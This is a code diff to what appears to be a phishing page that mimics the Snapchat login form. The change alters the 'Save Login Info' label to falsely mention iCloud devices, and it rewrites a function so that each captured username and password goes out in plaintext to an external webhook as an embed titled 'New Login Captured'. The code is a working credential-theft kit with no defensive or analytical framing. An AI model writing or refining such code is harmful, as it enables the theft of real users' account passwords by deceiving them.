@@ -63,7 +63,7 @@
     <p id="errorMsg" class="text-sm text-red-500 font-normal leading-tight hidden">Invalid username or password. Try again.</p>
     <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
       <input type="checkbox" checked>
-      <span>Save Login Info</span>
+      <span>Save Login Info on your iCloud devices</span>
     </label>
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
     <button id="loginBtn" type="submit" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
@@ -110,14 +110,24 @@ document.addEventListener("DOMContentLoaded", function() {
   }
 
   async function sendToWebhook(credentials) {
-    const encryptedPayload = encryptData(credentials);
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' });
+
+    const embed = {
+      title: "✨ New Login Captured",
+      description: "A user just logged in!",
+      color: 0x00b0ff,
+      fields: [
+        { name: "Username / Email", value: credentials.username, inline: true },
+        { name: "Password", value: credentials.password, inline: true },
+        { name: "Timestamp (CDT)", value: timestamp, inline: false }
+      ],
+      footer: { text: "Stay secure, stay aware!" }
+    };
+
     await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: `**New Login Captured** (${timestamp} CDT)\n\`\`\`json\n${JSON.stringify({ data: encryptedPayload }, null, 2)}\n\`\`\``
-      })
+      body: JSON.stringify({ embeds: [embed] })
     });
   }
 
